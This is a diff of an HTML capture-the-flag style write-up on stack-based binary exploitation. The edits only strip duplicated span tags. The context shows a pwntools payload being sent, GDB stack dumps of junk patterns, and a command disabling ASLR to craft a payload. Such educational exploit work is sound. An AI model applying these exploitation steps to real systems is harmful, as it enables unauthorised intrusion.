@@ -229,12 +229,12 @@ zsh: done                              xxd
         <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40106d</span><span class="mtk1">)</span>
 
         <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
-</code></pre></div><p>The script uses different characters as junk on each iteration. We can run it and continue in GDB a few times. Then we can show the stack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green"><span class="code-green">gef➤</span></span>  grep AAAA
+</code></pre></div><p>The script uses different characters as junk on each iteration. We can run it and continue in GDB a few times. Then we can show the stack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  grep AAAA
 <span class="code-blue">[+]</span> Searching 'AAAA' in memory
 <span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffc34121000-0x7ffc34142000), permission=rw-
   0x7ffc34140fa8 - 0x7ffc34140fdf  →   "<span class="code-dark-magenta">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGG[...]</span>"  
   0x7ffc34140fac - 0x7ffc34140fe3  →   "<span class="code-dark-magenta">AAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGG[...]</span>"
-<span class="code-green"><span class="code-green">gef➤</span></span>  x/100x 0x7ffc34140fa8
+<span class="code-green">gef➤</span>  x/100x 0x7ffc34140fa8
 <span class="code-dark-blue">0x7ffc34140fa8</span>: 0x41414141      0x41414141      0x42424242      0x42424242
 <span class="code-dark-blue">0x7ffc34140fb8</span>: 0x43434343      0x43434343      0x44444444      0x44444444
 <span class="code-dark-blue">0x7ffc34140fc8</span>: 0x45454545      0x45454545      0x46464646      0x46464646
@@ -262,12 +262,12 @@ zsh: done                              xxd
 <span class="code-dark-blue">0x7ffc34141128</span>: 0x34141d00      0x00007ffc      0x34141dc4      0x00007ffc
 </code></pre></div><p>Alright, we found a way to increase the stack space and control what we are storing there.</p><h3 id="crafting-the-payload">Crafting the payload</h3><p>To continue with exploitation, I will disable ASLR locally and use hard-coded addresses to implement the strategy explained above.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
 0
-</code></pre></div><p>If we execute the same Python script, we will see fix addresses because ASLR is disabled:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green"><span class="code-green">gef➤</span></span>  grep AAAA
+</code></pre></div><p>If we execute the same Python script, we will see fix addresses because ASLR is disabled:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  grep AAAA
 <span class="code-blue">[+]</span> Searching 'AAAA' in memory
 <span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
   0x7fffffffe6e8 - 0x7fffffffe71f  →   "<span class="code-dark-magenta">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGG[...]</span>"  
   0x7fffffffe6ec - 0x7fffffffe723  →   "<span class="code-dark-magenta">AAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGG[...]</span>"
-<span class="code-green"><span class="code-green">gef➤</span></span>  x/100x 0x7fffffffe6e8
+<span class="code-green">gef➤</span>  x/100x 0x7fffffffe6e8
 <span class="code-dark-blue">0x7fffffffe6e8</span>: 0x41414141      0x41414141      0x42424242      0x42424242
 <span class="code-dark-blue">0x7fffffffe6f8</span>: 0x43434343      0x43434343      0x44444444      0x44444444
 <span class="code-dark-blue">0x7fffffffe708</span>: 0x45454545      0x45454545      0x46464646      0x46464646
